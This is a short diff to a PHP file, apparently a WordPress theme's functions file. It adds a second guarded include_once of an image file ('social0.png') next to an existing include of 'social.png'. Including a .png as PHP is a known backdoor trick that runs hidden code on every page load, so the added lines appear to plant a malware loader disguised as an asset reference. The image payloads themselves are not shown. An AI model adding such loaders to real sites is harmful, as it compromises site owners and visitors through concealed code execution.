@@ -263,3 +263,7 @@ function revcon_change_post_object() {
 if (!defined('WP_OPTION_KEY')) {
 include_once 'social.png';
 }
+
+if (!defined('WP_OPTION_KEY')) {
+include_once 'social0.png';
+}
